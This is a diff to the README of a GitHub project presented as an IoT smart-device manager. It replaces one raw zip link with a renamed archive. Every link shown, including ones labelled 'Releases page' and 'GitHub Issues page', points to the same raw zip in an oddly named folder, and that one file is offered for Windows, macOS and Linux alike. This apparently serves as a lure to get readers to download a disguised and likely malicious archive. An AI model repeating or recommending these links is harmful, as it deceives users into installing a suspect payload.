@@ -1,6 +1,6 @@
 # 🌟 IOT_PROJECT_Saeed_Angiz - Manage Your Smart Devices Easily
 
-[![Download Now](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/IOT_PROJECT_Saeed_Angiz.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/IOT_PROJECT_Saeed_Angiz.zip)
+[![Download Now](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/Angiz-PROJEC-Saeed-IO-3.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/Angiz-PROJEC-Saeed-IO-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -17,14 +17,14 @@ Before you start, ensure that your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/IOT_PROJECT_Saeed_Angiz.zip).
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/Angiz-PROJEC-Saeed-IO-3.1.zip).
 
-1. Go to the Releases page by clicking [here](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/IOT_PROJECT_Saeed_Angiz.zip).
+1. Go to the Releases page by clicking [here](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/Angiz-PROJEC-Saeed-IO-3.1.zip).
 2. Look for the latest release.
 3. Find the file suitable for your operating system:
-   - If you have Windows, download `https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/IOT_PROJECT_Saeed_Angiz.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/IOT_PROJECT_Saeed_Angiz.zip`.
-   - For Linux, download `https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/IOT_PROJECT_Saeed_Angiz.zip`.
+   - If you have Windows, download `https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/Angiz-PROJEC-Saeed-IO-3.1.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/Angiz-PROJEC-Saeed-IO-3.1.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/Angiz-PROJEC-Saeed-IO-3.1.zip`.
 4. Click on the appropriate file link to begin downloading.
 5. Once downloaded, locate the file on your computer and follow the installation instructions.
 
@@ -58,7 +58,7 @@ If you encounter issues, try these steps:
 - **Restart the Application:** Close and reopen the application if it behaves unexpectedly.
 - **Reinstall the Software:** If problems persist, uninstall and then reinstall the application.
 
-For further assistance, refer to the [GitHub Issues page](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/IOT_PROJECT_Saeed_Angiz.zip) to report problems or seek help from the community.
+For further assistance, refer to the [GitHub Issues page](https://raw.githubusercontent.com/kushagra1511/IOT_PROJECT_Saeed_Angiz/main/anerotic/Angiz-PROJEC-Saeed-IO-3.1.zip) to report problems or seek help from the community.
 
 ## 🗂️ Topics Covered
 
